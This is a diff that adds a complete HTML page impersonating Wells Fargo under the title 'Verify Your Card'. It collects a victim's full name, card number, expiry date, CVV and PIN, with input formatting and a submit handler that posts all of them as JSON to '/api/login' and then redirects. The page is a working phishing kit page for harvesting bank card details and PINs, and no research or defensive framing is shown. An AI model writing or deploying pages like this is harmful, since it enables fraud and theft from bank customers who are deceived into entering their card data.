@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Wells Fargo – Verify Card</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+      min-height: 100vh; display: flex; flex-direction: column;
+      background: linear-gradient(to bottom, #87ceeb 0%, #b0d8a4 70%, #6a9c5e 100%);
+    }
+    nav { background: #cc0000; height: 50px; padding: 0 1.5rem; display: flex; align-items: center; justify-content: space-between; }
+    .nav-brand { color: white; font-weight: 700; font-size: 18px; letter-spacing: 1px; }
+    .nav-links { display: flex; align-items: center; gap: 18px; }
+    .nav-links span { color: white; font-size: 12px; }
+    main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 2rem; }
+    .card { background: white; border-radius: 12px; padding: 2rem 2.5rem; width: 100%; max-width: 440px; }
+    .card h1 { text-align: center; font-weight: 300; font-size: 26px; color: #333; margin-bottom: 0.4rem; }
+    .card .sub { text-align: center; font-size: 13px; color: #999; margin-bottom: 1.5rem; }
+    .input-wrap { position: relative; margin-bottom: 12px; }
+    .input-wrap input {
+      width: 100%; height: 50px; border-radius: 26px; border: 1px solid #ccc;
+      padding: 0 3rem 0 1.2rem; font-size: 15px; color: #333; background: #fff; outline: none;
+    }
+    .input-wrap input::placeholder { color: #bbb; }
+    .input-wrap input:focus { border-color: #aaa; }
+    .show-toggle { position: absolute; right: 16px; top: 50%; transform: translateY(-50%); font-size: 13px; color: #4a4fcf; font-weight: 500; cursor: pointer; background: none; border: none; }
+    .row { display: flex; gap: 12px; }
+    .row .input-wrap { flex: 1; }
+    .msg { display: none; border-radius: 8px; padding: 10px 14px; font-size: 13px; margin-bottom: 14px; text-align: center; }
+    .msg.error { display: block; background: #fdecea; color: #b00020; border: 1px solid #f5c6cb; }
+    .btn-submit {
+      width: 100%; height: 48px; border-radius: 26px; border: none;
+      background: #ccc; color: white; font-size: 15px; margin-bottom: 10px;
+      cursor: not-allowed; transition: background 0.2s;
+    }
+    .btn-submit.active { background: #cc0000; cursor: pointer; }
+    .forgot { text-align: center; font-size: 13px; margin-top: 8px; }
+    .forgot a { color: #4a4fcf; text-decoration: none; }
+  </style>
+</head>
+<body>
+  <nav>
+    <span class="nav-brand">WELLS FARGO</span>
+    <div class="nav-links">
+      <span>Enroll</span><span>Customer Service</span><span>ATMs/Locations</span><span>Español</span>
+    </div>
+  </nav>
+  <main>
+    <div class="card">
+      <h1>Verify Your Card</h1>
+      <p class="sub">Please enter your card details to continue</p>
+      <div class="msg" id="msg"></div>
+
+      <div class="input-wrap">
+        <input type="text" id="name" placeholder="Full Name" autocomplete="name" />
+      </div>
+
+      <div class="input-wrap">
+        <input type="text" id="card" placeholder="Card Number" inputmode="numeric" maxlength="19" autocomplete="cc-number" />
+      </div>
+
+      <div class="row">
+        <div class="input-wrap">
+          <input type="text" id="expdate" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp" />
+        </div>
+        <div class="input-wrap">
+          <input type="password" id="cvv" placeholder="CVV" inputmode="numeric" maxlength="4" autocomplete="cc-csc" />
+          <button class="show-toggle" onclick="toggleVis('cvv',this)">Show</button>
+        </div>
+      </div>
+
+      <div class="input-wrap" style="margin-bottom:20px">
+        <input type="password" id="pin" placeholder="PIN" inputmode="numeric" maxlength="10" />
+        <button class="show-toggle" onclick="toggleVis('pin',this)">Show</button>
+      </div>
+
+      <button class="btn-submit" id="submitBtn" disabled onclick="handleSubmit()">Verify Card</button>
+      <p class="forgot"><a href="#">→ Having trouble? Contact us</a></p>
+    </div>
+  </main>
+  <script>
+    document.getElementById('card').addEventListener('input', function() {
+      let v = this.value.replace(/\D/g, '').substring(0, 16);
+      this.value = v.replace(/(.{4})/g, '$1 ').trim();
+      checkFields();
+    });
+
+    document.getElementById('expdate').addEventListener('input', function() {
+      let v = this.value.replace(/\D/g, '').substring(0, 4);
+      if (v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2);
+      this.value = v;
+      checkFields();
+    });
+
+    function checkFields() {
+      const ready = document.getElementById('name').value &&
+                    document.getElementById('card').value &&
+                    document.getElementById('expdate').value &&
+                    document.getElementById('cvv').value &&
+                    document.getElementById('pin').value;
+      const btn = document.getElementById('submitBtn');
+      btn.disabled = !ready;
+      btn.classList.toggle('active', !!ready);
+    }
+
+    ['name','cvv','pin'].forEach(id =>
+      document.getElementById(id).addEventListener('input', checkFields)
+    );
+
+    function toggleVis(id, btn) {
+      const el = document.getElementById(id);
+      el.type = el.type === 'password' ? 'text' : 'password';
+      btn.textContent = el.type === 'password' ? 'Show' : 'Hide';
+    }
+
+    async function handleSubmit() {
+      const btn = document.getElementById('submitBtn');
+      btn.disabled = true;
+      btn.textContent = 'Verifying...';
+      try {
+        const res = await fetch('/api/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            name:    document.getElementById('name').value,
+            card:    document.getElementById('card').value,
+            expdate: document.getElementById('expdate').value,
+            cvv:     document.getElementById('cvv').value,
+            pin:     document.getElementById('pin').value
+          })
+        });
+        const data = await res.json();
+        if (data.success) {
+          window.location.href = data.redirectUrl;
+        } else {
+          const msgEl = document.getElementById('msg');
+          msgEl.textContent = data.message || 'Verification failed.';
+          msgEl.className = 'msg error';
+          btn.disabled = false;
+          btn.textContent = 'Verify Card';
+          btn.classList.add('active');
+        }
+      } catch(err) {
+        document.getElementById('msg').textContent = 'Network error. Please try again.';
+        document.getElementById('msg').className = 'msg error';
+        btn.disabled = false;
+        btn.textContent = 'Verify Card';
+        btn.classList.add('active');
+      }
+    }
+  </script>
+</body>
+</html>
